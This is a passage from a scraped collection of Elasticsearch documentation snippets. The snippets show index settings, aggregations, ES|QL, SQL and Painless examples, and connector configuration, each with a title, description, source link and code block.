https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"tokenizer\": {\n          \"kuromoji_user_dict\": {\n            \"type\": \"kuromoji_tokenizer\",\n            \"mode\": \"extended\",\n            \"discard_punctuation\": \"false\",\n            \"user_dictionary\": \"userdict_ja.txt\",\n            \"lenient\": \"true\"\n          }\n        },\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"kuromoji_user_dict\"\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"東京スカイツリー\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Boxplot Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates the basic syntax for a boxplot aggregation in Elasticsearch, showing how to compute boxplot statistics for a numeric field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"boxplot\": {\n    \"field\": \"load_time\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Geo-point Mapping and Performing a Low-precision Geotile Grid Aggregation\nDESCRIPTION: This example creates a museums index with a geo_point field, indexes sample museum locations, and performs a low-precision geotile grid aggregation at precision level 8. The aggregation groups the museums into map tile buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geotilegrid-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"name\": \"Musée d'Orsay\"}\n\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"large-grid\": {\n      \"geotile_grid\": {\n        \"field\": \"location\",\n        \"precision\": 8\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Last Element from Split String using MV_LAST in ESQL\nDESCRIPTION: This snippet demonstrates how to split a string by semicolons and then extract the last element using the MV_LAST function in ESQL. It uses the SPLIT function to divide the string and MV_LAST to retrieve the final element.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_last.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=\"foo;bar;baz\"\n| EVAL last_a = MV_LAST(SPLIT(a, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents in Elasticsearch using JavaScript\nDESCRIPTION: Demonstrates how to index documents into Elasticsearch using the JavaScript client.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/inference.nlp.tokenizers/spm_precompiled_normalizer.txt#2025-04-21_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { Client } = require('@elastic/elasticsearch')\nconst client = new Client({ node: 'http://localhost:9200' })\n\nasync function run () {\n  await client.index({\n    index: 'game-of-thrones',\n    id: '1',\n    body: {\n      character: 'Ned Stark',\n      quote: 'Winter is coming.'\n    }\n  })\n\n  await client.indices.refresh({ index: 'game-of-thrones' })\n}\n\nrun().catch(console.log)\n```\n\n----------------------------------------\n\nTITLE: Configuring Global Store Type in Elasticsearch YAML\nDESCRIPTION: Example of setting the global store type to 'hybridfs' in the Elasticsearch configuration file. This affects all indices unless overridden.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/store.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.store.type: hybridfs\n```\n\n----------------------------------------\n\nTITLE: Converting Single Integer to String using TO_STRING in ESQL\nDESCRIPTION: Demonstrates how to convert a single integer value to a string using the TO_STRING function. The example shows conversion of integer 10 to string \"10\".\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_string.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=10\n| EVAL j = TO_STRING(a)\n```\n\n----------------------------------------\n\nTITLE: Configuring Preload in elasticsearch.yml\nDESCRIPTION: Configuration example showing how to set index.store.preload in the elasticsearch.yml file to preload specific file extensions (nvd and dvd) into the file system cache.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/preloading-data-into-file-system-cache.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.store.preload: [\"nvd\", \"dvd\"]\n```\n\n----------------------------------------\n\nTITLE: Indexing Unsigned Long Values in Elasticsearch\nDESCRIPTION: This snippet shows how to index documents with unsigned long values using the bulk API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /my_index/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"my_counter\": 0}\n{\"index\":{\"_id\":2}}\n{\"my_counter\": 9223372036854775808}\n{\"index\":{\"_id\":3}}\n{\"my_counter\": 18446744073709551614}\n{\"index\":{\"_id\":4}}\n{\"my_counter\": 18446744073709551615}\n```\n\n----------------------------------------\n\nTITLE: Configuring Secure Key Password for Remote Cluster Server SSL in Elasticsearch\nDESCRIPTION: Secure setting for the key password within the keystore used for remote cluster server SSL. By default, it uses the keystore password if not specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_34\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.keystore.secure_key_password\n```\n\n----------------------------------------\n\nTITLE: Type Support Matrix in Markdown Table Format\nDESCRIPTION: A markdown table showing the supported type combinations for ESQL operations. The table has three columns: left-hand side (lhs) type, right-hand side (rhs) type, and the resulting type of the operation. All combinations result in boolean values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/greater_than_or_equal.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| date | date | boolean |\n| date | date_nanos | boolean |\n| date_nanos | date | boolean |\n| date_nanos | date_nanos | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | long | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Converting Multivalued Expression to Single Value using MV_FIRST in ESQL\nDESCRIPTION: This example demonstrates how to use the MV_FIRST function in ESQL to extract the first value from a multivalued column. It uses the SPLIT function to create a multivalued column from a string, then applies MV_FIRST to get the first value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_first.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=\"foo;bar;baz\"\n| EVAL first_a = MV_FIRST(SPLIT(a, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Excluding Unigrams from Shingle Filter Output in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure the shingle filter to output only shingles, excluding unigrams from the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"shingle\",\n      \"min_shingle_size\": 2,\n      \"max_shingle_size\": 3,\n      \"output_unigrams\": false\n    }\n  ],\n  \"text\": \"quick brown fox jumps\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Power with Integer Exponent in ESQL\nDESCRIPTION: This snippet demonstrates using the POW function to calculate the power of a number with an integer exponent. It uses a base of 2.0 and an exponent of 2 to calculate 2 squared.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/pow.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW base = 2.0, exponent = 2\n| EVAL result = POW(base, exponent)\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON MultiPolygon in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON MultiPolygon geometry in Elasticsearch. MultiPolygon represents a collection of polygons, with the second polygon containing a hole defined by an interior ring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"MultiPolygon\",\n    \"coordinates\" : [\n      [ [[102.0, 2.0], [103.0, 2.0], [103.0, 3.0], [102.0, 3.0], [102.0, 2.0]] ],\n      [ [[100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0], [100.0, 0.0]],\n        [[100.2, 0.2], [100.8, 0.2], [100.8, 0.8], [100.2, 0.8], [100.2, 0.2]] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Bucket Count K-S Test Aggregation in Elasticsearch\nDESCRIPTION: A basic example of a bucket_count_ks_test aggregation that compares distributions. It specifies the buckets path to count values, alternative hypothesis types to calculate, and the sampling method for the K-S statistic.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-count-ks-test-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"bucket_count_ks_test\": {\n    \"buckets_path\": \"range_values>_count\", <1>\n    \"alternative\": [\"less\", \"greater\", \"two_sided\"], <2>\n    \"sampling_method\": \"upper_tail\" <3>\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring MongoDB Connector Configuration File\nDESCRIPTION: Sample YAML configuration for connecting to Elasticsearch and MongoDB with Docker\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: mongodb\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Generating Version Field Cast Query in Elasticsearch\nDESCRIPTION: This snippet shows how to create a query for version comparison with concatenation in Elasticsearch. It uses a script to concatenate the version field with a constant keyword before comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_30\n\nLANGUAGE: eql\nCODE:\n```\nprocess where CONCAT(version, constant_keyword) > \"2\"\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalEqlScriptUtils.multiValueDocValues(doc,params.v1,X1->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.concat([X0,X1]),params.v2))))\",\"params\":{\"v0\":\"version\",\"v1\":\"constant_keyword\",\"v2\":\"2\"}}}\n```\n\n----------------------------------------\n\nTITLE: Adding Days to DateTime\nDESCRIPTION: Demonstrates adding days to a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_11\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime updatedZdt = zdt.plusDays(3);\n```\n\n----------------------------------------\n\nTITLE: Creating a GeoIP Pipeline with Default Settings\nDESCRIPTION: Example of creating an ingest pipeline that uses the default city database to add geographical information to the 'geoip' field based on the 'ip' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ingest/pipeline/geoip\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"geoip\" : {\n        \"field\" : \"ip\"\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=geoip\n{\n  \"ip\": \"89.160.20.128\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Setting Maximum Query Nesting Depth\nDESCRIPTION: Static setting that limits the maximum nesting depth of queries to prevent stack overflow errors. Default value is 30.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: properties\nCODE:\n```\nindices.query.bool.max_nested_depth\n```\n\n----------------------------------------\n\nTITLE: Dissecting and Extracting Fields from a String using ESQL\nDESCRIPTION: This ESQL snippet demonstrates how to dissect a string containing date, message, and IP address information using the DISSECT function. It then selects specific fields using the KEEP clause. The input string follows a specific format, and the output is a table with extracted fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/basicDissect.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z - some text - 127.0.0.1\"\n| DISSECT a \"\"\"%{date} - %{msg} - %{ip}\"\"\"\n| KEEP date, msg, ip\n```\n\n----------------------------------------\n\nTITLE: Decoding HTTP Body Trace Logs\nDESCRIPTION: Unix command to decode and decompress HTTP body trace logs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_15\n\nLANGUAGE: sh\nCODE:\n```\ncat httptrace.log | sed -e 's/.*://' | base64 --decode | gzip --decompress\n```\n\n----------------------------------------\n\nTITLE: ESQL LOOKUP JOIN Query for Employee Languages\nDESCRIPTION: Performs a lookup join between employees and languages_lookup tables based on language_code. Filters employees with IDs between 10091 and 10094, and maps their language codes to language names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/lookup-join.csv-spec/filterOnLeftSide.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL language_code = languages\n| WHERE emp_no >= 10091 AND emp_no < 10094\n| LOOKUP JOIN languages_lookup ON language_code\n```\n\n----------------------------------------\n\nTITLE: Indexing Child Document\nDESCRIPTION: Indexes a child document linked to a specific parent document using routing and join field configuration to establish the parent-child relationship.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-parent-id-query.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"text\": \"This is a child document.\",\n  \"my-join-field\": {\n    \"name\": \"my-child\",\n    \"parent\": \"1\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Oracle Secure Connection\nDESCRIPTION: This snippet provides shell commands and configuration file content for setting up a secure connection to Oracle database.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ mkdir $ORACLE_HOME/ssl_wallet\n```\n\nLANGUAGE: shell\nCODE:\n```\nWALLET_LOCATION = (SOURCE = (METHOD = FILE) (METHOD_DATA = (DIRECTORY = $ORACLE_HOME/ssl_wallet)))\nSSL_CLIENT_AUTHENTICATION = FALSE\nSSL_VERSION = 1.0\nSSL_CIPHER_SUITES = (SSL_RSA_WITH_AES_256_CBC_SHA)\nSSL_SERVER_DN_MATCH = ON\n```\n\nLANGUAGE: shell\nCODE:\n```\n$ orapki wallet create -wallet path-to-oracle-home/ssl_wallet -auto_login_only\n$ orapki wallet add -wallet path-to-oracle-home/ssl_wallet -trusted_cert -cert path-to-oracle-home/ssl_wallet/root_ca.pem -auto_login_only\n```\n\n----------------------------------------\n\nTITLE: Defining and Using Rank Feature Fields in Elasticsearch\nDESCRIPTION: This example demonstrates how to define rank_feature fields in an index mapping, insert a document with rank feature values, and query using the rank_feature query. It shows both positively and negatively correlated features configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-feature.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pagerank\": {\n        \"type\": \"rank_feature\" <1>\n      },\n      \"url_length\": {\n        \"type\": \"rank_feature\",\n        \"positive_score_impact\": false <2>\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"pagerank\": 8,\n  \"url_length\": 22\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching SET Type Records\nDESCRIPTION: JSON configuration for advanced sync rules to fetch Redis database records where type is 'SET'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"type\": \"SET\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring Email Recipient Allowlist in Elasticsearch YAML\nDESCRIPTION: Specifies email addresses to which emails are allowed to be sent. Supports simple globbing patterns. Defaults to \"[\"*\"]\" to allow all recipients.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.recipient_allowlist\n```\n\n----------------------------------------\n\nTITLE: DATE_PARSE Example: Parse Date with Timezone\nDESCRIPTION: Demonstrates parsing a date string using DATE_PARSE with a given format and a specified timezone. This example shows how to convert a string in 'dd/MM/yyyy' format into a date with the timezone set to Europe/Athens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_41\n\nLANGUAGE: sql\nCODE:\n```\n\"{\n    \\\"query\\\" : \\\"SELECT DATE_PARSE('07/04/2020', 'dd/MM/yyyy') AS \\\\\\\"date\\\\\\\"\\\",\n    \\\"time_zone\\\" : \\\"Europe/Athens\\\"\\n}\n\\n   date\n------------\n2020-04-07T00:00:00.000+03:00\"\n```\n\n----------------------------------------\n\nTITLE: Clearing Shard Request Cache in Elasticsearch\nDESCRIPTION: This command manually expires the request cache for specified indices using the clear cache API. The request parameter is set to true to specifically target the request cache.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001,my-index-000002/_cache/clear?request=true\n```\n\n----------------------------------------\n\nTITLE: Configuring Pattern Replace Filter for Number Formatting\nDESCRIPTION: Example showing how to configure pattern_replace character filter to replace dashes with underscores in numbers using regular expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-replace-charfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"char_filter\": [\n            \"my_char_filter\"\n          ]\n        }\n      },\n      \"char_filter\": {\n        \"my_char_filter\": {\n          \"type\": \"pattern_replace\",\n          \"pattern\": \"(\\\\d+)-(?=\\\\d)\",\n          \"replacement\": \"$1_\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"My credit card is 123-456-789\"\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-line Comments in Painless\nDESCRIPTION: Examples demonstrating various ways to use multi-line comments in Painless scripts. Shows comments spanning multiple lines in different positions relative to code statements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-comments.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\n/* multi-\n   line\n   comment */\n\nint value; /* multi-\n              line\n              comment */ value = 0;\n\nint value; /* multi-line\n              comment */\n\n/* multi-line\n   comment */ int value;\n\nint value; /* multi-line\n              comment */ value = 0;\n\nint value; /* multi-line comment */ value = 0;\n```\n\n----------------------------------------\n\nTITLE: Example of TRUNC Function with Positive Precision\nDESCRIPTION: Shows truncating a negative decimal number to 1 decimal place, demonstrating that it simply removes excess decimal digits without rounding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TRUNC(-345.153, 1) AS trimmed;\n\n    trimmed\n---------------\n-345.1\n```\n\n----------------------------------------\n\nTITLE: Filtered Significant Text Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows how to use the filter_duplicate_text setting in a significant_text aggregation to improve search results by removing duplicate content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET news/_search\n{\n  \"query\": {\n    \"match\": {\n      \"content\": \"elasticsearch\"\n    }\n  },\n  \"aggs\": {\n    \"sample\": {\n      \"sampler\": {\n        \"shard_size\": 100\n      },\n      \"aggs\": {\n        \"keywords\": {\n          \"significant_text\": {\n            \"field\": \"content\",\n            \"filter_duplicate_text\": true\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Moving Function Aggregators in Elasticsearch Java\nDESCRIPTION: This class defines various statistical functions used in Elasticsearch pipeline aggregation. It includes methods for calculating the max, min, sum, and other statistical measures on a double array. These functions are part of the org.elasticsearch.search.aggregations.pipeline.MovingFunctions class and are crucial for performing dynamic data analysis within the Elasticsearch framework.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/aggregations/src/main/resources/org/elasticsearch/aggregations/moving_function_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.search.aggregations.pipeline.MovingFunctions {\n  double max(double[])\n  double min(double[])\n  double sum(double[])\n  double stdDev(double[], double)\n  double unweightedAvg(double[])\n  double linearWeightedAvg(double[])\n  double ewma(double[], double)\n  double holt(double[], double, double)\n  double holtWinters(double[], double, double, double, int, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Day Name with DAY_NAME in SQL\nDESCRIPTION: Extracts the day of the week from a date/datetime expression in text format (e.g., Monday, Tuesday). Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_55\n\nLANGUAGE: sql\nCODE:\n```\n\"DAY_NAME(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DAY_NAME(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\\n\\n      day\\n---------------\\nMonday\\n\"\n```\n\n----------------------------------------\n\nTITLE: Script-based Terms Aggregation with Runtime Fields\nDESCRIPTION: Example showing how to use runtime fields and scripting to customize term generation based on multiple fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"normalized_genre\": {\n      \"type\": \"keyword\",\n      \"script\": \"\"\"\n        String genre = doc['genre'].value;\n        if (doc['product'].value.startsWith('Anthology')) {\n          emit(genre + ' anthology');\n        } else {\n          emit(genre);\n        }\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": {\n        \"field\": \"normalized_genre\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATETIME_FORMAT Example: Format Time\nDESCRIPTION: Demonstrates formatting a time value using DATETIME_FORMAT with a specified pattern. This example shows how to format a time including fractional seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_45\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATETIME_FORMAT(CAST('11:22:33.987' AS TIME), 'HH mm ss.S') AS \\\"time\\\";\\n\\n      time\n------------------\n11 22 33.9\"\n```\n\n----------------------------------------\n\nTITLE: Single Line ES|QL Query\nDESCRIPTION: Shows how an ES|QL query can be written on a single line while maintaining the same functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nsource-command | processing-command1 | processing-command2\n```\n\n----------------------------------------\n\nTITLE: Querying Nested Documents with Source Disabled in Elasticsearch\nDESCRIPTION: Demonstrates querying nested documents with inner hits while disabling source and using doc value fields in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comments\": {\n        \"type\": \"nested\"\n      }\n    }\n  }\n}\n\nPUT test/_doc/1?refresh\n{\n  \"title\": \"Test title\",\n  \"comments\": [\n    {\n      \"author\": \"kimchy\",\n      \"text\": \"comment text\"\n    },\n    {\n      \"author\": \"nik9000\",\n      \"text\": \"words words words\"\n    }\n  ]\n}\n\nPOST test/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"comments\",\n      \"query\": {\n        \"match\": {\"comments.text\" : \"words\"}\n      },\n      \"inner_hits\": {\n        \"_source\" : false,\n        \"docvalue_fields\" : [\n          \"comments.text.keyword\"\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Connector - Elasticsearch API\nDESCRIPTION: This snippet provides the API call to create an API key necessary for the Microsoft Teams connector. It defines the role descriptors and necessary privileges. The expected output includes the encoded key that should be stored securely for future use.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Total Goals with Script Fields in Painless\nDESCRIPTION: Shows how to use Painless in script_fields to calculate the total goals for each player by summing the values in the goals array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET hockey/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"total_goals\": {\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"\"\"\n          int total = 0;\n          for (int i = 0; i < doc['goals'].length; ++i) {\n            total += doc['goals'][i];\n          }\n          return total;\n        \"\"\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Process Sequence with Termination Check\nDESCRIPTION: Enhanced query using until keyword to prevent false positives from PID reuse.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_20\n\nLANGUAGE: eql\nCODE:\n```\nsequence by process.pid\n  [ process where event.type == \"start\" and process.name == \"cmd.exe\" ]\n  [ process where file.extension == \"exe\" ]\nuntil [ process where event.type == \"stop\" ]\n```\n\n----------------------------------------\n\nTITLE: HISTOGRAM with Expressions in Elasticsearch SQL\nDESCRIPTION: Demonstrates using expressions within HISTOGRAM function, showing how to group by salary 